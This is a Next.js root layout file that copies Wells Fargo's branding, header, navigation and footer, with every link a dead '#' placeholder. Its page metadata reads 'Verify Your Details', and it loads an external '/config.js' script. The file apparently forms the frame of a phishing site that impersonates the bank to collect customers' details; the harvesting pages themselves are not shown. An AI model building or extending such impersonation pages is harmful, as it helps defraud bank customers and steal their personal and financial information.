import { Geist, Geist_Mono, Merriweather } from "next/font/google";
import "./globals.css";

const geistSans = Geist({
  variable: "--font-geist-sans",
  subsets: ["latin"],
});

const geistMono = Geist_Mono({
  variable: "--font-geist-mono",
  subsets: ["latin"],
});

const brandSerif = Merriweather({
  subsets: ["latin"],
  weight: ["700", "900"],
});

export const metadata = {
  title: "Wells Fargo",
  description: "Verify Your Details",
};

export default function RootLayout({ children }) {
  return (
    <html lang="en">
      <head>
        {/* Config for static hosting */}
        <script src="/config.js" async></script>
      </head>
      <body
        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
      >
        <header className="w-full bg-[#d71f27] text-white border-b-4 border-[#f3c34b]">
          <div className="mx-auto max-w-7xl px-4">
            <div className="h-14 flex items-center gap-6">
              <div
                className={`${brandSerif.className} text-2xl sm:text-3xl font-extrabold tracking-wide`}
              >
                WELLS FARGO
              </div>
              <div className="ml-auto flex items-center gap-4">
                <nav className="hidden md:flex items-center gap-5 text-sm opacity-90">
                  <a href="#" className="hover:underline">
                    Enroll
                  </a>
                  <a href="#" className="hover:underline">
                    Customer Service
                  </a>
                  <a href="#" className="hover:underline">
                    ATMs/Locations
                  </a>
                  <a href="#" className="hover:underline">
                    Español
                  </a>
                </nav>
                <div className="relative hidden sm:block">
                  <input
                    type="text"
                    placeholder="Search"
                    className="h-8 w-28 sm:w-36 pl-3 pr-8 rounded-md bg-white text-[#444] placeholder-[#7a7a7a] focus:outline-none"
                  />
                  <svg
                    className="absolute right-2 top-1/2 -translate-y-1/2 w-4 h-4 text-[#555]"
                    fill="currentColor"
                    viewBox="0 0 20 20"
                  >
                    <path
                      fillRule="evenodd"
                      d="M8 4a4 4 0 100 8 4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z"
                      clipRule="evenodd"
                    />
                  </svg>
                </div>
              </div>
            </div>
          </div>
        </header>
        <main className="min-h-[calc(100vh-6rem)]">{children}</main>
        <footer className="w-full bg-[#f0f0f0] text-[#666] text-xs py-6">
          <div className="mx-auto max-w-7xl px-4">
            <div className="flex flex-wrap gap-x-6 gap-y-2 justify-center md:justify-start mb-4">
              <a href="#" className="hover:underline">
                About Wells Fargo
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Online Access Agreement
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Privacy, Cookies, Security & Legal
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Do not sell or share my personal information
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Notice of Data Collection
              </a>
            </div>
            <div className="flex flex-wrap gap-x-6 gap-y-2 justify-center md:justify-start mb-4">
              <a href="#" className="hover:underline">
                Report Email Fraud
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Security Center
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Sitemap
              </a>
              <span className="hidden md:inline text-gray-400">|</span>
              <a href="#" className="hover:underline">
                Give Us Feedback
              </a>
            </div>
            <div className="text-center md:text-left text-gray-600">
              © 1999 - 2025 Wells Fargo. All rights reserved. NMLSR ID 399801
            </div>
          </div>
        </footer>
      </body>
    </html>
  );
}
